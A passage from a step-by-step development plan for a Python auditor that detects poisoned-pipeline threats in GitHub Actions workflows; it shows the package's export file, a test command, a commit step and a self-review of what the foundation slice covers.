- [ ] **Step 3: Write minimal implementation**

```python
# credence/workflow_audit/__init__.py
"""Workflow-threat detection engine (GitHub Actions poisoned-pipeline auditor)."""

from .models import (
    Severity, Confidence, Platform,
    Step, Job, Workflow, ResolvedStep,
    WorkflowFinding, WorkflowAuditResult,
)
from .parser import parse_workflow, parse_action, run_script_refs
from .normalize import normalize_run
from .taint import resolve_job
from .allowlist import (
    is_platform_host, is_installer_host, parse_suppressions, Suppression,
)

__all__ = [
    "Severity", "Confidence", "Platform",
    "Step", "Job", "Workflow", "ResolvedStep",
    "WorkflowFinding", "WorkflowAuditResult",
    "parse_workflow", "parse_action", "run_script_refs",
    "normalize_run", "resolve_job",
    "is_platform_host", "is_installer_host", "parse_suppressions", "Suppression",
]
```

- [ ] **Step 4: Run the full foundation test suite**

Run: `pytest tests/test_workflow_models.py tests/test_workflow_parser.py tests/test_workflow_normalize.py tests/test_workflow_allowlist.py tests/test_workflow_taint.py -v`
Expected: PASS (all foundation tests, ~20)

- [ ] **Step 5: Commit**

```bash
git add credence/workflow_audit/__init__.py tests/test_workflow_models.py
git commit -m "feat(workflow-audit): public package exports + foundation smoke test"
```

---

## Self-Review (against spec §3/§5/§6/§9)

- **Spec coverage (foundation slice):** models incl. `identity_flags`/`persists_in_history_only`/`suppressed` (§9) ✓; parser with `parse_ok` fallback for Approach C (§3) ✓; composite-action + local-script parsing (F-005, partial — discovery of `action.yml` files happens in Plan 3 `scan.py`) ✓; normalization (F-010) ✓; env→secret + decode-to-file taint (F-001/F-003) ✓; host allowlist + visible suppression (F-007/F-008) ✓. Deferred to later plans (intentional): platform globs/grammar (Plan 2 `platforms.py`), all rules (Plan 2), history/dangling/identity/dedup (Plan 3), output/CLI/gating (Plan 3).
- **Placeholder scan:** none — every code step has complete code.
- **Type consistency:** `Severity`/`Confidence` are `(str, Enum)` with uppercase values matching `cli_gating.SEVERITY_ORDER`; `WorkflowFinding.to_dict()["severity"]` is the uppercase string the gate reads; `ResolvedStep.secret_vars`/`tainted_files`/`normalized_run` names are used identically in Tasks 6–8 and will be consumed by Plan 2 rules. The `on:`→`True` YAML 1.1 quirk is explicitly handled.

## Boundary
Plan 1 delivers a self-contained, fully-tested parsing+taint library with **no detection rules and no CLI** yet. It produces no findings on its own; it is the substrate Plans 2 and 3 build on. `aiohttp` is intentionally absent (zero-egress invariant). New core dep: none beyond `PyYAML` (already core).
